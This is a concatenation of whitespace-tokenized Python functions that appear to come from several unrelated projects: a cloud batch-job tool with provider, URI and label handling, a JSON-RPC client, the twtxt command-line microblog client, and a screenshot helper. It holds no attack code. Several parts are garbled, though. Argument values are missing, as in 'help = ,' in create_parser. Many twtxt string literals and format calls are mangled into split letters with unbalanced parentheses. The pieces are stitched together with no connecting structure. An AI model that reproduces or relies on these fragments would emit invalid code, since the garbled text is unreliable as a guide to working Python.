def lookup_job_tasks ( self , statuses , user_ids = None , job_ids = None , job_names = None , task_ids = None , task_attempts = None , labels = None , create_time_min = None , create_time_max = None , max_tasks = 0 ) : statuses = None if statuses == { '*' } else statuses user_ids = None if user_ids == { '*' } else user_ids job_ids = None if job_ids == { '*' } else job_ids job_names = None if job_names == { '*' } else job_names task_ids = None if task_ids == { '*' } else task_ids task_attempts = None if task_attempts == { '*' } else task_attempts if labels or create_time_min or create_time_max : raise NotImplementedError ( 'Lookup by labels and create_time not yet supported by stub.' ) operations = [ x for x in self . _operations if ( ( not statuses or x . get_field ( 'status' , ( None , None ) ) [ 0 ] in statuses ) and ( not user_ids or x . get_field ( 'user' , None ) in user_ids ) and ( not job_ids or x . get_field ( 'job-id' , None ) in job_ids ) and ( not job_names or x . get_field ( 'job-name' , None ) in job_names ) and ( not task_ids or x . get_field ( 'task-id' , None ) in task_ids ) and ( not task_attempts or x . get_field ( 'task-attempt' , None ) in task_attempts ) ) ] if max_tasks > 0 : operations = operations [ : max_tasks ] return operations
def get_provider ( args , resources ) : provider = getattr ( args , 'provider' , 'google' ) if provider == 'google' : return google . GoogleJobProvider ( getattr ( args , 'verbose' , False ) , getattr ( args , 'dry_run' , False ) , args . project ) elif provider == 'google-v2' : return google_v2 . GoogleV2JobProvider ( getattr ( args , 'verbose' , False ) , getattr ( args , 'dry_run' , False ) , args . project ) elif provider == 'local' : return local . LocalJobProvider ( resources ) elif provider == 'test-fails' : return test_fails . FailsJobProvider ( ) else : raise ValueError ( 'Unknown provider: ' + provider )
def create_parser ( prog ) : parser = argparse . ArgumentParser ( prog = prog , formatter_class = DsubHelpFormatter ) parser . add_argument ( '--provider' , default = 'google-v2' , choices = [ 'local' , 'google' , 'google-v2' , 'test-fails' ] , help = , metavar = 'PROVIDER' ) return parser
def parse_args ( parser , provider_required_args , argv ) : # Add the provider required arguments epilog message epilog = 'Provider-required arguments:\n' for provider in provider_required_args : epilog += '  %s: %s\n' % ( provider , provider_required_args [ provider ] ) parser . epilog = epilog # Parse arguments args = parser . parse_args ( argv ) # For the selected provider, check the required arguments for arg in provider_required_args [ args . provider ] : if not args . __getattribute__ ( arg ) : parser . error ( 'argument --%s is required' % arg ) return args
def get_dstat_provider_args ( provider , project ) : provider_name = get_provider_name ( provider ) args = [ ] if provider_name == 'google' : args . append ( '--project %s' % project ) elif provider_name == 'google-v2' : args . append ( '--project %s' % project ) elif provider_name == 'local' : pass elif provider_name == 'test-fails' : pass else : # New providers should add their dstat required arguments here. assert False , 'Provider %s needs get_dstat_provider_args support' % provider args . insert ( 0 , '--provider %s' % provider_name ) return ' ' . join ( args )
def _format_task_uri ( fmt , job_metadata , task_metadata ) : values = { 'job-id' : None , 'task-id' : 'task' , 'job-name' : None , 'user-id' : None , 'task-attempt' : None } for key in values : values [ key ] = task_metadata . get ( key ) or job_metadata . get ( key ) or values [ key ] return fmt . format ( * * values )
def _google_v2_parse_arguments ( args ) : if ( args . zones and args . regions ) or ( not args . zones and not args . regions ) : raise ValueError ( 'Exactly one of --regions and --zones must be specified' ) if args . machine_type and ( args . min_cores or args . min_ram ) : raise ValueError ( '--machine-type not supported together with --min-cores or --min-ram.' )
def _group_tasks_by_jobid ( tasks ) : ret = collections . defaultdict ( list ) for t in tasks : ret [ t . get_field ( 'job-id' ) ] . append ( t ) return ret
def _validate_job_and_task_arguments ( job_params , task_descriptors ) : if not task_descriptors : return task_params = task_descriptors [ 0 ] . task_params # The use case for specifying a label or env/input/output parameter on # the command-line and also including it in the --tasks file is not obvious. # Should the command-line override the --tasks file? Why? # Until this use is articulated, generate an error on overlapping names. # Check labels from_jobs = { label . name for label in job_params [ 'labels' ] } from_tasks = { label . name for label in task_params [ 'labels' ] } intersect = from_jobs & from_tasks if intersect : raise ValueError ( 'Names for labels on the command-line and in the --tasks file must not ' 'be repeated: {}' . format ( ',' . join ( intersect ) ) ) # Check envs, inputs, and outputs, all of which must not overlap each other from_jobs = { item . name for item in job_params [ 'envs' ] | job_params [ 'inputs' ] | job_params [ 'outputs' ] } from_tasks = { item . name for item in task_params [ 'envs' ] | task_params [ 'inputs' ] | task_params [ 'outputs' ] } intersect = from_jobs & from_tasks if intersect : raise ValueError ( 'Names for envs, inputs, and outputs on the command-line and in the ' '--tasks file must not be repeated: {}' . format ( ',' . join ( intersect ) ) )
def run ( provider , job_resources , job_params , task_descriptors , name = None , dry_run = False , command = None , script = None , user = None , user_project = None , wait = False , retries = 0 , poll_interval = 10 , after = None , skip = False , project = None , disable_warning = False , unique_job_id = False ) : if not dry_run : provider_base . emit_provider_message ( provider ) if not disable_warning : raise ValueError ( 'Do not use this unstable API component!' ) if command and script : raise ValueError ( 'Cannot supply both a command and script value.' ) if command : if name : command_name = name else : command_name = _name_for_command ( command ) # Add the shebang line to ensure the command is treated as Bash script = job_model . Script ( command_name , '#!/usr/bin/env bash\n' + command ) elif script : # Read the script file script_file = dsub_util . load_file ( script ) script = job_model . Script ( os . path . basename ( script ) , script_file . read ( ) ) else : raise ValueError ( 'One of --command or a script name must be supplied' ) if retries and not wait : raise ValueError ( 'Requesting retries requires requesting wait' ) # The contract with providers and downstream code is that the job_params # and task_params contain 'labels', 'envs', 'inputs', and 'outputs'. job_model . ensure_job_params_are_complete ( job_params ) job_model . ensure_task_params_are_complete ( task_descriptors ) task_ids = { task_descriptor . task_metadata . get ( 'task-id' ) for task_descriptor in task_descriptors if task_descriptor . task_metadata . get ( 'task-id' ) is not None } # Job and task parameters from the user have been validated. # We can now compute some job and task properties, including: #  job_metadata such as the job-id, create-time, user-id, etc. #  task_resources such as the logging_path (which may include job-id, task-id) job_metadata = _get_job_metadata ( provider , user , name , script , task_ids , user_project , unique_job_id ) _resolve_task_resources ( job_metadata , job_resources , task_descriptors ) # Job and task properties are now all resolved. Begin execution! if not dry_run : print ( 'Job: %s' % job_metadata [ 'job-id' ] ) # Wait for predecessor jobs (if any) if after : if dry_run : print ( '(Pretend) waiting for: %s.' % after ) else : print ( 'Waiting for predecessor jobs to complete...' ) error_messages = _wait_after ( provider , after , poll_interval , True ) if error_messages : for msg in error_messages : print_error ( msg ) raise dsub_errors . PredecessorJobFailureError ( 'One or more predecessor jobs completed but did not succeed.' , error_messages , None ) # Launch all the job tasks! job_descriptor = job_model . JobDescriptor ( job_metadata , job_params , job_resources , task_descriptors ) launched_job = provider . submit_job ( job_descriptor , skip ) if not dry_run : if launched_job [ 'job-id' ] == dsub_util . NO_JOB : print ( 'Job output already present, skipping new job submission.' ) return { 'job-id' : dsub_util . NO_JOB } print ( 'Launched job-id: %s' % launched_job [ 'job-id' ] ) if launched_job . get ( 'task-id' ) : print ( '%s task(s)' % len ( launched_job [ 'task-id' ] ) ) print ( 'To check the status, run:' ) print ( "  dstat %s --jobs '%s' --users '%s' --status '*'" % ( provider_base . get_dstat_provider_args ( provider , project ) , launched_job [ 'job-id' ] , launched_job [ 'user-id' ] ) ) print ( 'To cancel the job, run:' ) print ( "  ddel %s --jobs '%s' --users '%s'" % ( provider_base . get_ddel_provider_args ( provider , project ) , launched_job [ 'job-id' ] , launched_job [ 'user-id' ] ) ) # Poll for job completion if wait : print ( 'Waiting for job to complete...' ) if retries : error_messages = _wait_and_retry ( provider , job_metadata [ 'job-id' ] , poll_interval , retries , job_descriptor ) else : error_messages = _wait_after ( provider , [ job_metadata [ 'job-id' ] ] , poll_interval , False ) if error_messages : for msg in error_messages : print_error ( msg ) raise dsub_errors . JobExecutionError ( 'One or more jobs finished with status FAILURE or CANCELED' ' during wait.' , error_messages , launched_job ) return launched_job
def _get_filtered_mounts ( mounts , mount_param_type ) : return set ( [ mount for mount in mounts if isinstance ( mount , mount_param_type ) ] )
def build_logging_param ( logging_uri , util_class = OutputFileParamUtil ) : if not logging_uri : return job_model . LoggingParam ( None , None ) recursive = not logging_uri . endswith ( '.log' ) oututil = util_class ( '' ) _ , uri , provider = oututil . parse_uri ( logging_uri , recursive ) if '*' in uri . basename : raise ValueError ( 'Wildcards not allowed in logging URI: %s' % uri ) return job_model . LoggingParam ( uri , provider )
def get_variable_name ( self , name ) : if not name : name = '%s%s' % ( self . _auto_prefix , self . _auto_index ) self . _auto_index += 1 return name
def parse_file_provider ( uri ) : providers = { 'gs' : job_model . P_GCS , 'file' : job_model . P_LOCAL } # URI scheme detector uses a range up to 30 since none of the IANA # registered schemes are longer than this. provider_found = re . match ( r'^([A-Za-z][A-Za-z0-9+.-]{0,29})://' , uri ) if provider_found : prefix = provider_found . group ( 1 ) . lower ( ) else : # If no provider is specified in the URI, assume that the local # filesystem is being used. Availability and validity of the local # file/directory will be checked later. prefix = 'file' if prefix in providers : return providers [ prefix ] else : raise ValueError ( 'File prefix not supported: %s://' % prefix )
def _validate_paths_or_fail ( uri , recursive ) : path , filename = os . path . split ( uri ) # dsub could support character ranges ([0-9]) with some more work, but for # now we assume that basic asterisk wildcards are sufficient. Reject any URI # that includes square brackets or question marks, since we know that # if they actually worked, it would be accidental. if '[' in uri or ']' in uri : raise ValueError ( 'Square bracket (character ranges) are not supported: %s' % uri ) if '?' in uri : raise ValueError ( 'Question mark wildcards are not supported: %s' % uri ) # Only support file URIs and *filename* wildcards # Wildcards at the directory level or "**" syntax would require better # support from the Pipelines API *or* doing expansion here and # (potentially) producing a series of FileParams, instead of one. if '*' in path : raise ValueError ( 'Path wildcard (*) are only supported for files: %s' % uri ) if '**' in filename : raise ValueError ( 'Recursive wildcards ("**") not supported: %s' % uri ) if filename in ( '..' , '.' ) : raise ValueError ( 'Path characters ".." and "." not supported ' 'for file names: %s' % uri ) # Do not allow non-recursive IO to reference directories. if not recursive and not filename : raise ValueError ( 'Input or output values that are not recursive must ' 'reference a filename or wildcard: %s' % uri )
def parse_uri ( self , raw_uri , recursive ) : # Assume recursive URIs are directory paths. if recursive : raw_uri = directory_fmt ( raw_uri ) # Get the file provider, validate the raw URI, and rewrite the path # component of the URI for docker and remote. file_provider = self . parse_file_provider ( raw_uri ) self . _validate_paths_or_fail ( raw_uri , recursive ) uri , docker_uri = self . rewrite_uris ( raw_uri , file_provider ) uri_parts = job_model . UriParts ( directory_fmt ( os . path . dirname ( uri ) ) , os . path . basename ( uri ) ) return docker_uri , uri_parts , file_provider
def make_param ( self , name , raw_uri , recursive ) : if not raw_uri : return self . param_class ( name , None , None , None , recursive , None ) docker_path , uri_parts , provider = self . parse_uri ( raw_uri , recursive ) return self . param_class ( name , raw_uri , docker_path , uri_parts , recursive , provider )
def _parse_image_uri ( self , raw_uri ) : # The string replace is so we don't have colons and double slashes in the # mount path. The idea is the resulting mount path would look like: # /mnt/data/mount/http/www.googleapis.com/compute/v1/projects/... docker_uri = os . path . join ( self . _relative_path , raw_uri . replace ( 'https://' , 'https/' , 1 ) ) return docker_uri
def _parse_local_mount_uri ( self , raw_uri ) : raw_uri = directory_fmt ( raw_uri ) _ , docker_path = _local_uri_rewriter ( raw_uri ) local_path = docker_path [ len ( 'file' ) : ] docker_uri = os . path . join ( self . _relative_path , docker_path ) return local_path , docker_uri
def _parse_gcs_uri ( self , raw_uri ) : # Assume URI is a directory path. raw_uri = directory_fmt ( raw_uri ) _ , docker_path = _gcs_uri_rewriter ( raw_uri ) docker_uri = os . path . join ( self . _relative_path , docker_path ) return docker_uri
def make_param ( self , name , raw_uri , disk_size ) : if raw_uri . startswith ( 'https://www.googleapis.com/compute' ) : # Full Image URI should look something like: # https://www.googleapis.com/compute/v1/projects/<project>/global/images/ # But don't validate further, should the form of a valid image URI # change (v1->v2, for example) docker_path = self . _parse_image_uri ( raw_uri ) return job_model . PersistentDiskMountParam ( name , raw_uri , docker_path , disk_size , disk_type = None ) elif raw_uri . startswith ( 'file://' ) : local_path , docker_path = self . _parse_local_mount_uri ( raw_uri ) return job_model . LocalMountParam ( name , raw_uri , docker_path , local_path ) elif raw_uri . startswith ( 'gs://' ) : docker_path = self . _parse_gcs_uri ( raw_uri ) return job_model . GCSMountParam ( name , raw_uri , docker_path ) else : raise ValueError ( 'Mount parameter {} must begin with valid prefix.' . format ( raw_uri ) )
def validate_param_name ( name , param_type ) : # http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap03.html#tag_03_235 # # 3.235 Name # In the shell command language, a word consisting solely of underscores, # digits, and alphabetics from the portable character set. if not re . match ( r'^[a-zA-Z_][a-zA-Z0-9_]*$' , name ) : raise ValueError ( 'Invalid %s: %s' % ( param_type , name ) )
def validate_bucket_name ( bucket ) : if not bucket . startswith ( 'gs://' ) : raise ValueError ( 'Invalid bucket path "%s". Must start with "gs://".' % bucket ) bucket_name = bucket [ len ( 'gs://' ) : ] if not re . search ( r'^\w[\w_\.-]{1,61}\w$' , bucket_name ) : raise ValueError ( 'Invalid bucket name: %s' % bucket )
def convert_to_label_chars ( s ) : # We want the results to be user-friendly, not just functional. # So we can't base-64 encode it. #   * If upper-case: lower-case it #   * If the char is not a standard letter or digit. make it a dash # March 2019 note: underscores are now allowed in labels. # However, removing the conversion of underscores to dashes here would # create inconsistencies between old jobs and new jobs. # With existing code, $USER "jane_doe" has a user-id label of "jane-doe". # If we remove the conversion, the user-id label for new jobs is "jane_doe". # This makes looking up old jobs more complicated. accepted_characters = string . ascii_lowercase + string . digits + '-' def label_char_transform ( char ) : if char in accepted_characters : return char if char in string . ascii_uppercase : return char . lower ( ) return '-' return '' . join ( label_char_transform ( c ) for c in s )
def ensure_task_params_are_complete ( task_descriptors ) : for task_desc in task_descriptors : for param in [ 'labels' , 'envs' , 'inputs' , 'outputs' , 'input-recursives' , 'output-recursives' ] : if not task_desc . task_params . get ( param ) : task_desc . task_params [ param ] = set ( )
def _validate_label ( cls , name , value ) : # Rules for labels are described in: #  https://cloud.google.com/compute/docs/labeling-resources#restrictions # * Keys and values cannot be longer than 63 characters each. # * Keys and values can only contain lowercase letters, numeric characters, #   underscores, and dashes. # * International characters are allowed. # * Label keys must start with a lowercase letter and international #   characters are allowed. # * Label keys cannot be empty. cls . _check_label_name ( name ) cls . _check_label_value ( value ) # Ensure that reserved labels are not being used. if not cls . _allow_reserved_keys and name in RESERVED_LABELS : raise ValueError ( 'Label flag (%s=...) must not use reserved keys: %r' % ( name , list ( RESERVED_LABELS ) ) )
def from_yaml ( cls , yaml_string ) : try : job = yaml . full_load ( yaml_string ) except AttributeError : # For installations that cannot update their PyYAML version job = yaml . load ( yaml_string ) # If the YAML does not contain a top-level dsub version, then assume that # the string is coming from the local provider, reading an old version of # its meta.yaml. dsub_version = job . get ( 'dsub-version' ) if not dsub_version : return cls . _from_yaml_v0 ( job ) job_metadata = { } for key in [ 'job-id' , 'job-name' , 'task-ids' , 'user-id' , 'dsub-version' , 'user-project' , 'script-name' ] : if job . get ( key ) is not None : job_metadata [ key ] = job . get ( key ) # Make sure that create-time string is turned into a datetime job_metadata [ 'create-time' ] = dsub_util . replace_timezone ( job . get ( 'create-time' ) , pytz . utc ) job_resources = Resources ( logging = job . get ( 'logging' ) ) job_params = { } job_params [ 'labels' ] = cls . _label_params_from_dict ( job . get ( 'labels' , { } ) ) job_params [ 'envs' ] = cls . _env_params_from_dict ( job . get ( 'envs' , { } ) ) job_params [ 'inputs' ] = cls . _input_file_params_from_dict ( job . get ( 'inputs' , { } ) , False ) job_params [ 'input-recursives' ] = cls . _input_file_params_from_dict ( job . get ( 'input-recursives' , { } ) , True ) job_params [ 'outputs' ] = cls . _output_file_params_from_dict ( job . get ( 'outputs' , { } ) , False ) job_params [ 'output-recursives' ] = cls . _output_file_params_from_dict ( job . get ( 'output-recursives' , { } ) , True ) job_params [ 'mounts' ] = cls . _mount_params_from_dict ( job . get ( 'mounts' , { } ) ) task_descriptors = [ ] for task in job . get ( 'tasks' , [ ] ) : task_metadata = { 'task-id' : task . get ( 'task-id' ) } # Old instances of the meta.yaml do not have a task create time. create_time = task . get ( 'create-time' ) if create_time : task_metadata [ 'create-time' ] = dsub_util . replace_timezone ( create_time , pytz . utc ) if task . get ( 'task-attempt' ) is not None : task_metadata [ 'task-attempt' ] = task . get ( 'task-attempt' ) task_params = { } task_params [ 'labels' ] = cls . _label_params_from_dict ( task . get ( 'labels' , { } ) ) task_params [ 'envs' ] = cls . _env_params_from_dict ( task . get ( 'envs' , { } ) ) task_params [ 'inputs' ] = cls . _input_file_params_from_dict ( task . get ( 'inputs' , { } ) , False ) task_params [ 'input-recursives' ] = cls . _input_file_params_from_dict ( task . get ( 'input-recursives' , { } ) , True ) task_params [ 'outputs' ] = cls . _output_file_params_from_dict ( task . get ( 'outputs' , { } ) , False ) task_params [ 'output-recursives' ] = cls . _output_file_params_from_dict ( task . get ( 'output-recursives' , { } ) , True ) task_resources = Resources ( logging_path = task . get ( 'logging-path' ) ) task_descriptors . append ( TaskDescriptor ( task_metadata , task_params , task_resources ) ) return JobDescriptor ( job_metadata , job_params , job_resources , task_descriptors )
def find_task_descriptor ( self , task_id ) : # It is not guaranteed that the index will be task_id - 1 when --tasks is # used with a min/max range. for task_descriptor in self . task_descriptors : if task_descriptor . task_metadata . get ( 'task-id' ) == task_id : return task_descriptor return None
def get_file_environment_variables ( file_params ) : env = { } for param in file_params : # We have no cases where the environment variable provided to user # scripts have a trailing slash, so be sure to always strip it. # The case that this is specifically handling is --input-recursive and # --output-recursive variables, which are directory values. env [ param . name ] = os . path . join ( DATA_MOUNT_POINT , param . docker_path . rstrip ( '/' ) ) if param . value else '' return env
def get_job_and_task_param ( job_params , task_params , field ) : return job_params . get ( field , set ( ) ) | task_params . get ( field , set ( ) )
def _emit_search_criteria ( user_ids , job_ids , task_ids , labels ) : print ( 'Delete running jobs:' ) print ( '  user:' ) print ( '    %s\n' % user_ids ) print ( '  job-id:' ) print ( '    %s\n' % job_ids ) if task_ids : print ( '  task-id:' ) print ( '    %s\n' % task_ids ) # Labels are in a LabelParam namedtuple and must be reformated for printing. if labels : print ( '  labels:' ) print ( '    %s\n' % repr ( labels ) )
def get_action_by_id ( op , action_id ) : actions = get_actions ( op ) if actions and 1 <= action_id < len ( actions ) : return actions [ action_id - 1 ]
def _get_action_by_name ( op , name ) : actions = get_actions ( op ) for action in actions : if action . get ( 'name' ) == name : return action
def get_action_environment ( op , name ) : action = _get_action_by_name ( op , name ) if action : return action . get ( 'environment' )
def get_action_image ( op , name ) : action = _get_action_by_name ( op , name ) if action : return action . get ( 'imageUri' )
def get_event_of_type ( op , event_type ) : events = get_events ( op ) if not events : return None return [ e for e in events if e . get ( 'details' , { } ) . get ( '@type' ) == event_type ]
def get_last_update ( op ) : last_update = get_end_time ( op ) if not last_update : last_event = get_last_event ( op ) if last_event : last_update = last_event [ 'timestamp' ] if not last_update : last_update = get_create_time ( op ) return last_update
def prepare_output ( self , row ) : date_fields = [ 'last-update' , 'create-time' , 'start-time' , 'end-time' ] int_fields = [ 'task-attempt' ] for col in date_fields : if col in row : row [ col ] = self . default_format_date ( row [ col ] ) for col in int_fields : if col in row and row [ col ] is not None : row [ col ] = int ( row [ col ] ) return row
def trim_display_field ( self , value , max_length ) : if not value : return '' if len ( value ) > max_length : return value [ : max_length - 3 ] + '...' return value
def format_pairs ( self , values ) : return ', ' . join ( '%s=%s' % ( key , value ) for key , value in sorted ( values . items ( ) ) )
def string_presenter ( self , dumper , data ) : if '\n' in data : return dumper . represent_scalar ( 'tag:yaml.org,2002:str' , data , style = '|' ) else : return dumper . represent_scalar ( 'tag:yaml.org,2002:str' , data )
def prepare_job_metadata ( script , job_name , user_id , create_time ) : # The name of the pipeline gets set into the ephemeralPipeline.name as-is. # The default name of the pipeline is the script name # The name of the job is derived from the job_name and gets set as a # 'job-name' label (and so the value must be normalized). if job_name : pipeline_name = job_name job_name_value = job_model . convert_to_label_chars ( job_name ) else : pipeline_name = os . path . basename ( script ) job_name_value = job_model . convert_to_label_chars ( pipeline_name . split ( '.' , 1 ) [ 0 ] ) # The user-id will get set as a label user_id = job_model . convert_to_label_chars ( user_id ) # Now build the job-id. We want the job-id to be expressive while also # having a low-likelihood of collisions. # # For expressiveness, we: # * use the job name (truncated at 10 characters). # * insert the user-id # * add a datetime value # To have a high likelihood of uniqueness, the datetime value is out to # hundredths of a second. # # The full job-id is: #   <job-name>--<user-id>--<timestamp> job_id = '%s--%s--%s' % ( job_name_value [ : 10 ] , user_id , create_time . strftime ( '%y%m%d-%H%M%S-%f' ) [ : 16 ] ) # Standard version is MAJOR.MINOR(.PATCH). This will convert the version # string to "vMAJOR-MINOR(-PATCH)". Example; "0.1.0" -> "v0-1-0". version = job_model . convert_to_label_chars ( 'v%s' % DSUB_VERSION ) return { 'pipeline-name' : pipeline_name , 'job-name' : job_name_value , 'job-id' : job_id , 'user-id' : user_id , 'dsub-version' : version , }
def get_operation_full_job_id ( op ) : job_id = op . get_field ( 'job-id' ) task_id = op . get_field ( 'task-id' ) if task_id : return '%s.%s' % ( job_id , task_id ) else : return job_id
def send_payload ( self , params ) : data = json . dumps ( { 'jsonrpc' : self . version , 'method' : self . service_name , 'params' : params , 'id' : text_type ( uuid . uuid4 ( ) ) } ) data_binary = data . encode ( 'utf-8' ) url_request = Request ( self . service_url , data_binary , headers = self . headers ) return urlopen ( url_request ) . read ( )
def json_rpc_format ( self ) : error = { 'name' : text_type ( self . __class__ . __name__ ) , 'code' : self . code , 'message' : '{0}' . format ( text_type ( self . message ) ) , 'data' : self . data } if current_app . config [ 'DEBUG' ] : import sys , traceback error [ 'stack' ] = traceback . format_exc ( ) error [ 'executable' ] = sys . executable return error
def discover ( cls ) : file = os . path . join ( Config . config_dir , Config . config_name ) return cls . from_file ( file )
def write_config ( self ) : with open ( self . config_file , "w" ) as config_file : self . cfg . write ( config_file )
def check_config_sanity ( self ) : is_sane = True # This extracts some properties which cannot be checked like "nick", # but it is definitely better than writing the property names as a # string literal. properties = [ property_name for property_name , obj in self . __class__ . __dict__ . items ( ) if isinstance ( obj , property ) ] for property_name in properties : try : getattr ( self , property_name ) except ValueError as e : click . echo ( " Config error on {0} - {1}".f o rmat(p r operty_name,  e )   is_sane = False return is_sane
def validate_config_key ( ctx , param , value ) : if not value : return value try : section , item = value . split ( "." , 1 ) except ValueError : raise click . BadArgumentUsage ( "Given key does not contain a section name." ) else : return section , item
def make_aware ( dt ) : return dt if dt . tzinfo else dt . replace ( tzinfo = timezone . utc )
def from_file ( cls , file , * args , * * kwargs ) : try : cache = shelve . open ( file ) return cls ( file , cache , * args , * * kwargs ) except OSError as e : logger . debug ( "Loading {0} failed" . format ( file ) ) raise e
def discover ( cls , * args , * * kwargs ) : file = os . path . join ( Cache . cache_dir , Cache . cache_name ) return cls . from_file ( file , * args , * * kwargs )
def is_cached ( self , url ) : try : return True if url in self . cache else False except TypeError : return False
def add_tweets ( self , url , last_modified , tweets ) : try : self . cache [ url ] = { "last_modified" : last_modified , "tweets" : tweets } self . mark_updated ( ) return True except TypeError : return False
def get_tweets ( self , url , limit = None ) : try : tweets = self . cache [ url ] [ "tweets" ] self . mark_updated ( ) return sorted ( tweets , reverse = True ) [ : limit ] except KeyError : return [ ]
def remove_tweets ( self , url ) : try : del self . cache [ url ] self . mark_updated ( ) return True except KeyError : return False
def cli ( ctx , config , verbose ) : init_logging ( debug = verbose ) if ctx . invoked_subcommand == "quickstart" : return # Skip initializing config file try : if config : conf = Config . from_file ( config ) else : conf = Config . discover ( ) except ValueError as e : if "Error in config file." in str ( e ) : click . echo ( " Please correct the errors mentioned above an run twtxt again.")  else : click . echo ( " Config file not found or not readable. You may want to run twtxt quickstart.")  sys . exit ( ) ctx . default_map = conf . build_default_map ( ) ctx . obj = { 'conf' : conf }
def tweet ( ctx , created_at , twtfile , text ) : text = expand_mentions ( text ) tweet = Tweet ( text , created_at ) if created_at else Tweet ( text ) pre_tweet_hook = ctx . obj [ "conf" ] . pre_tweet_hook if pre_tweet_hook : run_pre_tweet_hook ( pre_tweet_hook , ctx . obj [ "conf" ] . options ) if not add_local_tweet ( tweet , twtfile ) : click . echo ( " Couldnt write to file.")  else : post_tweet_hook = ctx . obj [ "conf" ] . post_tweet_hook if post_tweet_hook : run_post_tweet_hook ( post_tweet_hook , ctx . obj [ "conf" ] . options )
def timeline ( ctx , pager , limit , twtfile , sorting , timeout , porcelain , source , cache , force_update ) : if source : source_obj = ctx . obj [ "conf" ] . get_source_by_nick ( source ) if not source_obj : logger . debug ( "Not following {0}, trying as URL" . format ( source ) ) source_obj = Source ( source , source ) sources = [ source_obj ] else : sources = ctx . obj [ "conf" ] . following tweets = [ ] if cache : try : with Cache . discover ( update_interval = ctx . obj [ "conf" ] . timeline_update_interval ) as cache : force_update = force_update or not cache . is_valid if force_update : tweets = get_remote_tweets ( sources , limit , timeout , cache ) else : logger . debug ( "Multiple calls to 'timeline' within {0} seconds. Skipping update" . format ( cache . update_interval ) ) # Behold, almighty list comprehensions! (I might have gone overboard here) tweets = list ( chain . from_iterable ( [ cache . get_tweets ( source . url ) for source in sources ] ) ) except OSError as e : logger . debug ( e ) tweets = get_remote_tweets ( sources , limit , timeout ) else : tweets = get_remote_tweets ( sources , limit , timeout ) if twtfile and not source : source = Source ( ctx . obj [ "conf" ] . nick , ctx . obj [ "conf" ] . twturl , file = twtfile ) tweets . extend ( get_local_tweets ( source , limit ) ) if not tweets : return tweets = sort_and_truncate_tweets ( tweets , sorting , limit ) if pager : click . echo_via_pager ( style_timeline ( tweets , porcelain ) ) else : click . echo ( style_timeline ( tweets , porcelain ) )
def follow ( ctx , nick , url , force ) : source = Source ( nick , url ) sources = ctx . obj [ 'conf' ] . following if not force : if source . nick in ( source . nick for source in sources ) : click . confirm ( " Youre already following {0}. Overwrite?".for m at(  click . style ( source . nick , bold = True ) ) , default = False , abort = True ) _ , status = get_remote_status ( [ source ] ) [ 0 ] if not status or status . status_code != 200 : click . confirm ( " The feed of {0} at {1} is not available. Follow anyway?".f o rmat(  click . style ( source . nick , bold = True ) , click . style ( source . url , bold = True ) ) , default = False , abort = True ) ctx . obj [ 'conf' ] . add_source ( source ) click . echo ( " Youre now following {0}.".for m at(  click . style ( source . nick , bold = True ) ) )
def unfollow ( ctx , nick ) : source = ctx . obj [ 'conf' ] . get_source_by_nick ( nick ) try : with Cache . discover ( ) as cache : cache . remove_tweets ( source . url ) except OSError as e : logger . debug ( e ) ret_val = ctx . obj [ 'conf' ] . remove_source_by_nick ( nick ) if ret_val : click . echo ( " Youve unfollowed {0}.".for m at(  click . style ( source . nick , bold = True ) ) ) else : click . echo ( " Youre not following {0}.".for m at(  click . style ( nick , bold = True ) ) )
def quickstart ( ) : width = click . get_terminal_size ( ) [ 0 ] width = width if width <= 79 else 79 click . secho ( "twtxt - quickstart" , fg = "cyan" ) click . secho ( "==================" , fg = "cyan" ) click . echo ( ) help_text = "This wizard will generate a basic configuration file for twtxt with all mandatory options set. " "You can change all of these later with either twtxt itself or by editing the config file manually. " "Have a look at the docs to get information about the other available options and their meaning." click . echo ( textwrap . fill ( help_text , width ) ) click . echo ( ) nick = click . prompt ( " Please enter your desired nick",  d fault=o s .e n viron.g e t(" U SER",  " ))   def overwrite_check ( path ) : if os . path . isfile ( path ) : click . confirm ( " '{0}' already exists. Overwrite?".f o rmat(p a th),   a ort=T r ue)  cfgfile = click . prompt ( " Please enter the desired location for your config file",  os . path . join ( Config . config_dir , Config . config_name ) , type = click . Path ( readable = True , writable = True , file_okay = True ) ) cfgfile = os . path . expanduser ( cfgfile ) overwrite_check ( cfgfile ) twtfile = click . prompt ( " Please enter the desired location for your twtxt file",  os . path . expanduser ( "~/twtxt.txt" ) , type = click . Path ( readable = True , writable = True , file_okay = True ) ) twtfile = os . path . expanduser ( twtfile ) overwrite_check ( twtfile ) twturl = click . prompt ( " Please enter the URL your twtxt file will be accessible from",  default = "https://example.org/twtxt.txt" ) disclose_identity = click . confirm ( " Do you want to disclose your identity? Your nick and URL will be shared when " "making HTTP requests" , default = False ) click . echo ( ) add_news = click . confirm ( " Do you want to follow the twtxt news feed?",  d fault=T r ue)  conf = Config . create_config ( cfgfile , nick , twtfile , twturl , disclose_identity , add_news ) twtfile_dir = os . path . dirname ( twtfile ) if not os . path . exists ( twtfile_dir ) : os . makedirs ( twtfile_dir ) open ( twtfile , "a" ) . close ( ) click . echo ( ) click . echo ( " Created config file at '{0}'.".f o rmat(c l ick.f o rmat_filename(c o nf.c o nfig_file)) )   click . echo ( " Created twtxt file at '{0}'.".f o rmat(c l ick.f o rmat_filename(t w tfile)) )  
def config ( ctx , key , value , remove , edit ) : conf = ctx . obj [ "conf" ] if not edit and not key : raise click . BadArgumentUsage ( "You have to specify either a key or use --edit." ) if edit : return click . edit ( filename = conf . config_file ) if remove : try : conf . cfg . remove_option ( key [ 0 ] , key [ 1 ] ) except Exception as e : logger . debug ( e ) else : conf . write_config ( ) return if not value : try : click . echo ( conf . cfg . get ( key [ 0 ] , key [ 1 ] ) ) except Exception as e : logger . debug ( e ) return if not conf . cfg . has_section ( key [ 0 ] ) : conf . cfg . add_section ( key [ 0 ] ) conf . cfg . set ( key [ 0 ] , key [ 1 ] , value ) conf . write_config ( )
def relative_datetime ( self ) : now = datetime . now ( timezone . utc ) tense = "from now" if self . created_at > now else "ago" return "{0} {1}" . format ( humanize . naturaldelta ( now - self . created_at ) , tense )
def save ( url , * args , * * kwargs ) : device = heimdallDevice ( kwargs . get ( 'device' , None ) ) kwargs [ 'width' ] = kwargs . get ( 'width' , None ) or device . width kwargs [ 'height' ] = kwargs . get ( 'height' , None ) or device . height kwargs [ 'user_agent' ] = kwargs . get ( 'user_agent' , None ) or device . user_agent screenshot_image = screenshot ( url , * * kwargs ) if kwargs . get ( 'optimize' ) : image = Image . open ( screenshot_image . path ) image . save ( screenshot_image . path , optimize = True ) return screenshot_image
